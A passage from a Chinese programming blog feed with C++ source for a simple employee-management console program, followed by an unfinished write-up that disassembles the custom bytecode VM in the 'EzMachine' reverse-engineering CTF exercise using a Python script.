class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;employee.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">Employee::Employee(<span class="keyword">int</span> Id, <span class="built_in">string</span> Name, <span class="keyword">int</span> JobId)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_Id = Id;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_Name = Name;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_JobId = JobId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Employee::showInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;职工编号： &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;m_Id</span><br><span class="line">&lt;&lt; <span class="string">&quot; \t职工姓名： &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;m_Name</span><br><span class="line">&lt;&lt; <span class="string">&quot; \t岗位：&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;getJobName()</span><br><span class="line">&lt;&lt; <span class="string">&quot; \t岗位职责：完成经理交给的任务&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">Employee::getJobName</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;员工&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>manager.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;worker.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manager</span> :</span><span class="keyword">public</span> Worker</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Manager(<span class="keyword">int</span> Id, <span class="built_in">string</span> Name, <span class="keyword">int</span> JobId);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">showInfo</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="built_in">string</span> <span class="title">getJobName</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>manager.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;manager.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">Manager::Manager(<span class="keyword">int</span> Id, <span class="built_in">string</span> Name, <span class="keyword">int</span> JobId)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_Id = Id;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_Name = Name;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_JobId = JobId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Manager::showInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;职工编号： &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;m_Id</span><br><span class="line">&lt;&lt; <span class="string">&quot; \t职工姓名： &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;m_Name</span><br><span class="line">&lt;&lt; <span class="string">&quot; \t岗位：&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;getJobName()</span><br><span class="line">&lt;&lt; <span class="string">&quot; \t岗位职责：完成老板交给的任务&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">Manager::getJobName</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;经理&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>boss.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;worker.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boss</span> :</span><span class="keyword">public</span> Worker</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Boss(<span class="keyword">int</span> Id, <span class="built_in">string</span> Name, <span class="keyword">int</span> JobId);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">showInfo</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="built_in">string</span> <span class="title">getJobName</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>boss.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;boss.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">Boss::Boss(<span class="keyword">int</span> Id, <span class="built_in">string</span> Name, <span class="keyword">int</span> JobId)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_Id = Id;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_Name = Name;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_JobId = JobId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Boss::showInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;职工编号： &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;m_Id</span><br><span class="line">&lt;&lt; <span class="string">&quot; \t职工姓名： &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;m_Name</span><br><span class="line">&lt;&lt; <span class="string">&quot; \t岗位：&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;getJobName()</span><br><span class="line">&lt;&lt; <span class="string">&quot; \t岗位职责：管理所有职工&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">Boss::getJobName</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;老板&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;workerManager.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WorkerManager wm;</span><br><span class="line"><span class="keyword">int</span> choice=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">wm.Showmenu();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入您的选择:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; choice;</span><br><span class="line"><span class="keyword">switch</span> (choice)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: <span class="comment">//退出系统</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: <span class="comment">//添加职工</span></span><br><span class="line">wm.AddEmp();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: <span class="comment">//显示职工</span></span><br><span class="line">wm.ShowEmp();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>: <span class="comment">//删除职工</span></span><br><span class="line">wm.DeleteEmp();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>: <span class="comment">//修改职工</span></span><br><span class="line">wm.UpdateEmp();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>: <span class="comment">//查找职工</span></span><br><span class="line">wm.FindEmp();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>: <span class="comment">//排序职工</span></span><br><span class="line">wm.SortEmp();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>: <span class="comment">//清空文件</span></span><br><span class="line">wm.ClearFile();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VM</title>
      <link href="2021/07/15/vm/"/>
      <url>2021/07/15/vm/</url>
      
        <content type="html"><![CDATA[<h1 id="VM-专场"><a href="#VM-专场" class="headerlink" title="VM 专场"></a>VM 专场</h1><p>之前一直遇到vm的题都没怎么去管，现在来学习学习。</p><p>总结一下，做vm的题主要要知道，那些是伪寄存器，那些是伪堆栈，一般都是以全局变量存在，哪些是vm函数，分别有什么功能，怎么调用的伪寄存器。而且vm的加密过程应该都不会弄太过于复杂的。</p><h2 id="EzMachine"><a href="#EzMachine" class="headerlink" title="EzMachine"></a>EzMachine</h2><p>来自buu的一道经典vm。在看了SYJ师傅的文章后，豁然开朗。<br>分析主函数<br><img src="https://i.loli.net/2021/07/15/yhMfN94wdZEgxIc.png"><br>看看程序中自己写的vm_function，和伪寄存器。<br><img src="https://i.loli.net/2021/07/15/d1jx9K4pTNfWXq6.png"><br>先还原程序流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">code&#x3D;[0x01, 0x03, 0x03, 0x05, 0x00, 0x00, 0x11, 0x00, 0x00, 0x01, 0x01, 0x11, 0x0C, 0x00, 0x01, 0x0D, 0x0A, 0x00, 0x01, 0x03, 0x01, 0x05, 0x00, 0x00, 0xFF, 0x00, 0x00, 0x01, 0x02, 0x00, 0x01, 0x00, 0x11, 0x0C, 0x00, 0x02, 0x0D, 0x2B, 0x00, 0x14, 0x00, 0x02, 0x01, 0x01, 0x61, 0x0C, 0x00, 0x01, 0x10, 0x1A, 0x00, 0x01, 0x01, 0x7A, 0x0C, 0x00, 0x01, 0x0F, 0x1A, 0x00, 0x01, 0x01, 0x47, 0x0A, 0x00, 0x01, 0x01, 0x01, 0x01, 0x06, 0x00, 0x01, 0x0B, 0x24, 0x00, 0x01, 0x01, 0x41, 0x0C, 0x00, 0x01, 0x10, 0x24, 0x00, 0x01, 0x01, 0x5A, 0x0C, 0x00, 0x01, 0x0F, 0x24, 0x00, 0x01, 0x01, 0x4B, 0x0A, 0x00, 0x01, 0x01, 0x01, 0x01, 0x07, 0x00, 0x01, 0x01, 0x01, 0x10, 0x09, 0x00, 0x01, 0x03, 0x01, 0x00, 0x03, 0x00, 0x00, 0x01, 0x01, 0x01, 0x06, 0x02, 0x01, 0x0B, 0x0B, 0x00, 0x02, 0x07, 0x00, 0x02, 0x0D, 0x00, 0x02, 0x00, 0x00, 0x02, 0x05, 0x00, 0x02, 0x01, 0x00, 0x02, 0x0C, 0x00, 0x02, 0x01, 0x00, 0x02, 0x00, 0x00, 0x02, 0x00, 0x00, 0x02, 0x0D, 0x00, 0x02, 0x05, 0x00, 0x02, 0x0F, 0x00, 0x02, 0x00, 0x00, 0x02, 0x09, 0x00, 0x02, 0x05, 0x00, 0x02, 0x0F, 0x00, 0x02, 0x03, 0x00, 0x02, 0x00, 0x00, 0x02, 0x02, 0x00, 0x02, 0x05, 0x00, 0x02, 0x03, 0x00, 0x02, 0x03, 0x00, 0x02, 0x01, 0x00, 0x02, 0x07, 0x00, 0x02, 0x07, 0x00, 0x02, 0x0B, 0x00, 0x02, 0x02, 0x00, 0x02, 0x01, 0x00, 0x02, 0x02, 0x00, 0x02, 0x07, 0x00, 0x02, 0x02, 0x00, 0x02, 0x0C, 0x00, 0x02, 0x02, 0x00, 0x02, 0x02, 0x00, 0x01, 0x02, 0x01, 0x13, 0x01, 0x02, 0x04, 0x00, 0x00, 0x0C, 0x00, 0x01, 0x0E, 0x5B, 0x00, 0x01, 0x01, 0x22, 0x0C, 0x02, 0x01, 0x0D, 0x59, 0x00, 0x01, 0x01, 0x01, 0x06, 0x02, 0x01, 0x0B, 0x4E, 0x00, 0x01, 0x03, 0x00, 0x05, 0x00, 0x00, 0xFF, 0x00, 0x00, 0x01, 0x03, 0x01, 0x05, 0x00, 0x00, 0xFF, 0x00, 0x00, 0x00]</span><br><span class="line">reg_table&#x3D;&#123;</span><br><span class="line">    0:&#39;eax&#39;,</span><br><span class="line">    1:&#39;ebx&#39;,</span><br><span class="line">    2:&#39;ecx&#39;,</span><br><span class="line">    3:&#39;edx&#39;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">instructions&#x3D;&#123;</span><br><span class="line">    0: &#39;nop&#39;,</span><br><span class="line">    1: &#39;mov reg data&#39;,</span><br><span class="line">    2: &#39;push data&#39;,</span><br><span class="line">    3: &#39;push_reg&#39;,</span><br><span class="line">    4: &#39;pop_reg&#39;,</span><br><span class="line">    5:  &#39;printf&#39;,</span><br><span class="line">    6:  &#39;add_reg_reg1&#39;,</span><br><span class="line">    7:  &#39;sub_reg_reg1&#39;,</span><br><span class="line">    8:  &#39;mul&#39;,</span><br><span class="line">    9:  &#39;div&#39;,</span><br><span class="line">    10: &#39;xor&#39;,</span><br><span class="line">    11: &#39;jmp&#39;,</span><br><span class="line">    12: &#39;cmp&#39;,</span><br><span class="line">    13: &#39;je&#39;,</span><br><span class="line">    14: &#39;jne&#39;,</span><br><span class="line">    15: &#39;jg&#39;,</span><br><span class="line">    16: &#39;jl&#39;,</span><br><span class="line">    17: &#39;strlen&#39;,</span><br><span class="line">    18: &#39;mem_init&#39;,</span><br><span class="line">    19: &#39;pop_reg1_to_reg&#39;,</span><br><span class="line">    20: &#39;load_input&#39;,</span><br><span class="line">    0xff: &#39;exit&#39;&#125;</span><br><span class="line">for i in range(93):</span><br><span class="line">    if(instructions[code[i*3]]&#x3D;&#x3D;&#39;mov reg data&#39;):</span><br><span class="line">        print(str(i+1)+&#39;:mov &#39;+reg_table[code[i*3+1]]+&#39; &#39;+str(code[i*3+2]))</span><br><span class="line">    elif(instructions[code[i * 3]] &#x3D;&#x3D; &#39;cmp&#39;):</span><br><span class="line">        print(str(i + 1) + &#39;:cmp &#39; + reg_table[code[i * 3 + 1]] + &#39; &#39; + reg_table[code[i * 3 + 2]])</span><br><span class="line">    elif(instructions[code[i * 3]] &#x3D;&#x3D; &#39;add_reg_reg1&#39;):</span><br><span class="line">        print(str(i + 1) + &#39;:add &#39; + reg_table[code[i * 3 + 1]] + &#39; &#39; + reg_table[code[i * 3 + 2]])</span><br><span class="line">    elif (instructions[code[i * 3]] &#x3D;&#x3D; &#39;sub_reg_reg1&#39;):</span><br><span class="line">        print(str(i + 1) + &#39;:sub &#39; + reg_table[code[i * 3 + 1]] + &#39; &#39; + reg_table[code[i * 3 + 2]])</span><br><span class="line">    elif(instructions[code[i * 3]] &#x3D;&#x3D; &#39;push_reg&#39;):</span><br><span class="line">        print(str(i + 1) + &#39;:push &#39;+ reg_table[code[i * 3 + 1]])</span><br><span class="line">    elif (instructions[code[i * 3]] &#x3D;&#x3D; &#39;pop_reg&#39;):</span><br><span class="line">        print(str(i + 1) + &#39;:pop &#39; + reg_table[code[i * 3 + 1]])</span><br><span class="line">    else:</span><br><span class="line">        print(str(i+1)+&#39;:&#39;+instructions[code[i*3]]+&#39; &#39;+str(code[i*3+1])+&#39; &#39;+str(code[i*3+2]))</span><br></pre></td></tr></table></figure><p>再处理一下得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1:mov edx 3</span><br><span class="line">2:printf 0 0</span><br><span class="line">3:strlen 0 0</span><br><span class="line">4:mov ebx 17</span><br><span class="line">5:cmp eax ebx</span><br><span class="line">6:je 10 0</span><br><span class="line">7:mov edx 1</span><br><span class="line">8:printf 0 0</span><br><span class="line">9:exit 0 0</span><br><span class="line">10:mov ecx 0</span><br><span class="line">11:mov eax 17</span><br><span class="line">12:cmp eax ecx</span><br><span class="line">13:je 43 0</span><br><span class="line">14:load_input 0 2</span><br><span class="line">15:mov ebx 97</span><br><span class="line">16:cmp eax ebx</span><br><span class="line">17:jl 26 0</span><br><span class="line">18:mov ebx 122</span><br><span class="line">19:cmp eax ebx</span><br><span class="line">20:jg 26 0</span><br><span class="line">21:mov ebx 71</span><br><span class="line">22:xor 0 1</span><br><span class="line">23:mov ebx 1</span><br><span class="line">24:add eax ebx</span><br><span class="line">25:jmp 36 0</span><br><span class="line">26:mov ebx 65</span><br><span class="line">27:cmp eax ebx</span><br><span class="line">28:jl 36 0</span><br><span class="line">29:mov ebx 90</span><br><span class="line">30:cmp eax ebx</span><br><span class="line">31:jg 36 0</span><br><span class="line">32:mov ebx 75</span><br><span class="line">33:xor 0 1</span><br><span class="line">34:mov ebx 1</span><br><span class="line">35:sub eax ebx</span><br><span class="line">36:mov ebx 16</span><br><span class="line">37:div 0 1</span><br><span class="line">38push ebx</span><br><span class="line">39push eax</span><br><span class="line">40:mov ebx 1</span><br><span class="line">41:add ecx ebx</span><br><span class="line">42:jmp 11 0</span><br><span class="line">43:push data 7 0</span><br><span class="line">44:push data 13 0</span><br><span class="line">45:push data 0 0</span><br><span class="line">46:push data 5 0</span><br><span class="line">47:push data 1 0</span><br><span class="line">48:push data 12 0</span><br><span class="line">49:push data 1 0</span><br><span class="line">50:push data 0 0</span><br><span class="line">51:push data 0 0</span><br><span class="line">52:push data 13 0</span><br><span class="line">53:push data 5 0</span><br><span class="line">54:push data 15 0</span><br><span class="line">55:push data 0 0</span><br><span class="line">56:push data 9 0</span><br><span class="line">57:push data 5 0</span><br><span class="line">58:push data 15 0</span><br><span class="line">59:push data 3 0</span><br><span class="line">60:push data 0 0</span><br><span class="line">61:push data 2 0</span><br><span class="line">62:push data 5 0</span><br><span class="line">63:push data 3 0</span><br><span class="line">64:push data 3 0</span><br><span class="line">65:push data 1 0</span><br><span class="line">66:push data 7 0</span><br><span class="line">67:push data 7 0</span><br><span class="line">68:push data 11 0</span><br><span class="line">69:push data 2 0</span><br><span class="line">70:push data 1 0</span><br><span class="line">71:push data 2 0</span><br><span class="line">72:push data 7 0</span><br><span class="line">73:push data 2 0</span><br><span class="line">74:push data 12 0</span><br><span class="line">75:push data 2 0</span><br><span class="line">76:push data 2 0</span><br><span class="line">77:mov ecx 1</span><br><span class="line">78:stack_to_reg ebx ecx</span><br><span class="line">79:pop eax</span><br><span class="line">80:cmp eax ebx</span><br><span class="line">81:jne 91 0</span><br><span class="line">82:mov ebx 34</span><br><span class="line">83:cmp ecx ebx</span><br><span class="line">84:je 89 0</span><br><span class="line">85:mov ebx 1</span><br><span class="line">86:add ecx ebx</span><br><span class="line">87:jmp 78 0</span><br><span class="line">88:mov edx 0</span><br><span class="line">89:printf 0 0</span><br><span class="line">90:exit 0 0</span><br><span class="line">91:mov edx 1</span><br><span class="line">92:printf 0 0</span><br><span class="line">93:exit 0 0</span><br></pre></td></tr></table></figure><p>撸一下汇编，翻译如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">code=[<span class="number">0x7</span>,<span class="number">0xd</span>,<span class="number">0x0</span>,<span class="number">0x5</span>,<span class="number">0x1</span>,<span class="number">0xc</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0xd</span>,<span class="number">0x5</span>,<span class="number">0xf</span>,<span class="number">0x0</span>,<span class="number">0x9</span>,<span class="number">0x5</span>,<span class="number">0xf</span>,<span class="number">0x3</span>,<span class="number">0x0</span>,<span class="number">0x2</span>,<span class="number">0x5</span>,<span class="number">0x3</span>,<span class="number">0x3</span>,<span class="number">0x1</span>,<span class="number">0x7</span>,<span class="number">0x7</span>,<span class="number">0xb</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x7</span>,<span class="number">0x2</span>,<span class="number">0xc</span>,<span class="number">0x2</span>,<span class="number">0x2</span>]</span><br><span class="line">code1=[]</span><br><span class="line"><span class="built_in">input</span>=[<span class="number">0</span>*<span class="number">17</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">input</span>:</span><br><span class="line">    tmp1=i</span><br><span class="line">    tmp2=i</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">65</span>&lt;=i&lt;=<span class="number">90</span>):</span><br><span class="line">        i=i^<span class="number">75</span>+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(<span 